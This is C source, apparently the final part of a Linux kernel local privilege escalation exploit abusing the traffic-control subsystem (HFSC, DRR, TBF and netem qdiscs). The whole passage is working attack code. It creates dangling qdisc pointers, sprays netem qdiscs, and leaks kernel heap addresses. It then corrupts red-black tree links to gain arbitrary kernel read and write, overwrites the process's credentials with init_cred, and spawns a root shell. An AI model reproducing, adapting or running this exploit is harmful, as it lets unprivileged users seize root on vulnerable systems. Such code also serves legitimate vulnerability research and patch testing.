    int b1, b2, b3, pin, tbfp;

    /* Add subtree root */
    hfsc_qdisc_msg.def = 1;
    tc_add_qd(&hfsc_qdisc_msg, parent, root);

    /* Set up upper layers */
    b1 = tc_add_cl(&rsc_class_msg, root, 1);
    b1 = tc_add_qd(&drr_qdisc_msg, b1, root + 0x10000);
    pin = tc_add_cl(&drr_class_msg, b1, 2);
    b1 = tc_add_cl(&drr_class_msg, b1, 1);

    b2 = tc_add_cl(&fsc_class_msg, root, 2);
    b2 = tc_add_qd(&drr_qdisc_msg, b2, root + 0x30000);

    b3 = tc_add_cl(&fsc_class_msg, root, 3);
    b3 = tc_add_qd(&drr_qdisc_msg, b3, root + 0x40000);
    tc_add_fl(b3 | 1);

    /* Create dangling pointer above TBF qdisc */
    tc_add_fl(b1);
    trigger_vuln(b1);
    tc_del_fl(b1);
    tc_add_fl(pin);
    loopback_send();
    loopback_send();

    hfsc_qdisc_msg.def = 2;
    tc_add_qd(&hfsc_qdisc_msg, parent, root);

    tc_del_cl(b1);
    tbfp = b2 = drr_spray_and_find(b2);

    /* Add TBF qdisc */
    b2 = tc_add_qd(&tbf_qdisc_msg, b2, root + 0x50000);
    b2 = tc_add_qd(&drr_qdisc_msg, b2, root + 0x60000);
    tc_add_fl(b2 | 1);

    for (int i = 0; i < clog_len; i++) {
        tc_add_cl(&drr_class_msg, b2, i + 2);
    }

    /* Create dangling pointer under TBF qdisc */
    b2 = tc_add_cl(&drr_class_msg, b2, 1);

    trigger_vuln(b2);

    hfsc_qdisc_msg.def = 3;
    tc_add_qd(&hfsc_qdisc_msg, parent, root);

    tc_del_fl(tbfp);
    tc_del_cl(b2);
    b3 = drr_spray_and_find(b3);

    tc_add_qd(&stall_tbf_qdisc_msg, tbfp, 0);

    /* Choose netem handles */
    for (int i = 0x10000000, j = 0; j < NETEM_SPRAY; i += 0x10000) {
        if (QDISC_HASH(i) == spray_hash)
            spray_handles[j++] = i;
    }

    /* Wait for previously deleted qdiscs to be freed */
    printf("[*] Adding qdisc timer node %d\n", label);
    if (membarrier(MEMBARRIER_CMD_GLOBAL, 0) == -1)
        err_exit("[-] membarrier");

    /* Destroy TBF qdisc */
    tc_del_cl(tbfp);

    /* Set timer on TBF qdisc */
    if (sendto(client_sock_fd, &msgbuf, LABEL_TO_VALUE(label), 0, &iaddr, sizeof(iaddr)) == -1)
        err_exit("[-] sendto");

    /* Wait for TBF qdisc to be freed */
    if (membarrier(MEMBARRIER_CMD_GLOBAL, 0) == -1)
        err_exit("[-] membarrier");

    /* Spray netem qdiscs */
    for (int i = 0; i < NETEM_SPRAY; i++)
        b3 = tc_add_qd(&parms_netem_qdisc_msg, b3, spray_handles[i]);
}

int main (int argc, char **argv) {

    if (argc > 1) {
        clog_len = atoi(argv[1]);
    } else {
        clog_len = CLOG_LEN;
    }

    if (unshare(CLONE_NEWUSER) == -1)
        err_exit("[-] unshare(CLONE_NEWUSER)");
    if (unshare(CLONE_NEWNET) == -1)
        err_exit("[-] unshare(CLONE_NEWNET)");

    pin_cpu(0);

    /* Open socket to send netlink commands to */
    nl_sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (nl_sock_fd == -1)
        err_exit("[-] nl socket");

    /* Set loopback device up */
    if_up_msg.ifi.ifi_index = if_nametoindex("lo");
    netlink_write(nl_sock_fd, &if_up_msg);

    /* Open inet sockets */
    iaddr.sin_family = AF_INET;
    iaddr.sin_port = htons(1);
    iaddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    inet_sock_fd = socket(PF_INET, SOCK_DGRAM, 0);
    if (inet_sock_fd == -1)
        err_exit("[-] inet socket");
    if (bind(inet_sock_fd, &iaddr, sizeof(iaddr)) == -1)
        err_exit("[-] inet bind");
    client_sock_fd = socket(PF_INET, SOCK_DGRAM, 0);
    if (client_sock_fd == -1)
        err_exit("[-] inet socket");

    /* Add timer nodes to tree */
    init_timers();
    add_neg_nodes();
    for (int i = 0; i < NUM_NODES - 2; i++)
        add_timer_node(add_order[i]);

    /* Add dangling qdisc pointers to tree */
    int parent, n1, n2, netem_spray1[NETEM_SPRAY], netem_spray2[NETEM_SPRAY];

    hfsc_qdisc_msg.def = 1;
    tc_add_qd(&hfsc_qdisc_msg, -1, 0x150000);

    parent = tc_add_cl(&fsc_class_msg, 0x150000, 1);
    tc_add_qd(&hfsc_qdisc_msg, parent, 0x20000);

    parent = tc_add_cl(&fsc_class_msg, 0x20000, 1);
    add_qdisc_timer_nodes(parent, 0x1000000, netem_spray1, 1, add_order[NUM_NODES - 2]);

    hfsc_qdisc_msg.def = 2;
    tc_add_qd(&hfsc_qdisc_msg, 0, 0x20000);

    parent = tc_add_cl(&rsc_class_msg, 0x20000, 2);
    add_qdisc_timer_nodes(parent, 0x2000000, netem_spray2, 2, add_order[NUM_NODES - 1]);

    /* Enqueue a packet at netem_spray[0] for later */
    hfsc_qdisc_msg.def = 1;
    tc_add_qd(&hfsc_qdisc_msg, 0, 0x20000);
    loopback_send();

    /* Leak heap addresses of attacker netem qdics by removing 15 */

    long n1_base_kaddr, n1_parms_kaddr, n1_slot_kaddr, n2_base_kaddr, n2_parms_kaddr, n2_slot_kaddr;
    long n1_parms_buf[7] = {}, n2_parms_buf[7] = {};
    long n1_slot_buf[5] = {}, n2_slot_buf[5] = {};

    rm_timer_node(15);

    n1 = -1;
    for (int i = 0; i < NETEM_SPRAY; i++) {
        read_netem_parms(netem_spray1[i], n1_parms_buf);
        if (n1_parms_buf[0]) {
            n1 = netem_spray1[i];
            break;
        }
    }
    n2 = -1;
    for (int i = 0; i < NETEM_SPRAY; i++) {
        read_netem_parms(netem_spray2[i], n2_parms_buf);
        if (n2_parms_buf[0]) {
            n2 = netem_spray2[i];
            break;
        }
    }
    if (n1 == -1 || n2 == -1) {
        printf("[-] Heap address leak failed: n1 = %x, n2 = %x\n", n1, n2);
        exit(EXIT_FAILURE);
    }

    if (NETEM_SPRAY > 1) {
        tc_del_qd(n1);
        tc_del_qd(n2);
    }


    n2_parms_kaddr = n1_parms_buf[0];
    n2_base_kaddr = n2_parms_kaddr & ~1023;
    n2_slot_kaddr = n2_base_kaddr + PRIVDATA_OFF + SLOT_CONFIG_OFF;

    n1_parms_kaddr = n2_parms_buf[2];
    n1_base_kaddr = n1_parms_kaddr & ~1023;
    n1_slot_kaddr = n1_base_kaddr + PRIVDATA_OFF + SLOT_CONFIG_OFF;

    printf("[+] Found qdiscs: n1 handle = %x, n1 addr = %p\n"
           "                  n2 handle = %x, n2 addr = %p\n",
            n1, n1_base_kaddr, n2, n2_base_kaddr);


    /*  Overwrite n2->slot_dist by removing 13 (labeled n below)

         (n)          (s)
         / \          / \
       (x) (y)  ->  (x) (y)
           /            /
         (s)          (c)
           \
           (c)

        y is at &n2->latency
    */


    n2_parms_buf[2] = n1_parms_kaddr + 32; // y->rb_left = s = &n1_latency + 32
    n1_parms_buf[5] = n2_base_kaddr + PRIVDATA_OFF + SLOT_DIST_OFF; // s->rb_right = &n2->slot_dist
    n1_parms_buf[6] = 0; // s->rb_left = NULL

    write_netem_parms(n1, n1_parms_buf, n1_slot_buf);
    write_netem_parms(n2, n2_parms_buf, n2_slot_buf);

    rm_timer_node(13);

    /* Overwrite n2->hash.next by removing 11 (labeled n below)

         (n)          (s)
         / \          / \
       (x) (y)  ->  (x) (y)
           /            /
         (p)          (p)
         /            /
       (s)          (c)
         \
         (c)

        y is at &n1->latency + 32
     */

    n1_parms_buf[6] = n2_parms_kaddr + 32; // y->rb_left = p = &n1->latency + 32
    n2_parms_buf[6] = n1_slot_kaddr + 8; // p->rb_left = s = &n1->slot + 8
    n1_slot_buf[2] = n2_base_kaddr + 40; // s->rb_right = c = &n2->hash.next
    n1_slot_buf[3] = 0; // s->rb_left = NULL

    write_netem_parms(n1, n1_parms_buf, n1_slot_buf);
    write_netem_parms(n2, n2_parms_buf, n2_slot_buf);
    rm_timer_node(11);

    /* Set up arbitrary read */
    setup_stab_read(n2, n2_parms_kaddr, n2_slot_kaddr);

    printf("[*] Arbitrary read set up\n");


    /* Overwrite root qdisc's vt_tree by removing 9 (labeled n below)

         (n)          (s)
         / \          / \
       (x) (y)  ->  (x) (y)
           /            /
         (p)          (p)
         /            /
       (s)          (c)
         \
         (c)

        y is at &n1->slot + 8
     */

    long root_qdisc_kaddr, netdevq_kaddr;

    netdevq_kaddr = stab_read_8(n1_base_kaddr + NETDEV_OFF);
    root_qdisc_kaddr = stab_read_8(netdevq_kaddr + ROOT_QDISC_OFF);

    n1_slot_buf[3] = n1_parms_kaddr - 16; // y->rb_left = &n1->latency - 16
    n1_parms_buf[0] = n1_parms_kaddr + 32; // p->rb_left = &n1->latency + 32
    n1_parms_buf[5] = root_qdisc_kaddr + PRIVDATA_OFF + ROOT_OFF +
                      VT_TREE_OFF; // s->rb_left = &root_qdisc->privdata.root.vt_tree
    n1_parms_buf[6] = 0; // s->rb_right = NULL

    write_netem_parms(n1, n1_parms_buf, n1_slot_buf);

    rm_timer_node(9);

    /* Set up vt_node write primitive */
    setup_vt_write(n1, n1_base_kaddr);

    printf("[*] Write-what-where set up\n");

    /* Set f_owner pointer in socket file */
    if (fcntl(client_sock_fd, F_SETOWN, getpid()) == -1)
        err_exit("[-] fcntl");

    /* Read kernel pointers */
    long task_kaddr, init_task_kaddr, init_cred_kaddr, init_fs_kaddr;
    long next_addr;

    printf("[*] Getting kernel pointers\n");

    next_addr = handle_to_kaddr(netem_spray1[0], netdevq_kaddr);

    next_addr = stab_read_8(next_addr + PRIVDATA_OFF + T_HEAD_OFF);
    next_addr = stab_read_8(next_addr + SK_OFF);
    next_addr = stab_read_8(next_addr + SOCK_OFF);
    next_addr = stab_read_8(next_addr + FILE_OFF);
    next_addr = stab_read_8(next_addr + F_OWNER_OFF + PID_OFF);
    next_addr = stab_read_8(next_addr + TASKS_OFF);
    task_kaddr = next_addr -= PID_LINKS_OFF;

    do {
        init_task_kaddr = next_addr;
        next_addr = stab_read_8(next_addr + REAL_PARENT_OFF);
    } while (next_addr != init_task_kaddr);

    init_cred_kaddr = stab_read_8(init_task_kaddr + CRED_OFF);
    init_fs_kaddr = stab_read_8(init_task_kaddr + FS_OFF);

    printf("[+] task: %p, init_cred: %p, init_fs: %p\n",
            task_kaddr, init_cred_kaddr, init_fs_kaddr);

    printf("[*] Overwriting cred and fs\n");

    /* LPE */
    vt_write_8(task_kaddr + CRED_OFF, init_cred_kaddr);
    vt_write_8(task_kaddr + FS_OFF, init_fs_kaddr);

    if (getuid()) {
        printf("[-] Privesc failed\n");
        exit(EXIT_FAILURE);
    }

    printf("[*] Launching shell\n");
    system("/bin/sh");
    return 0;
}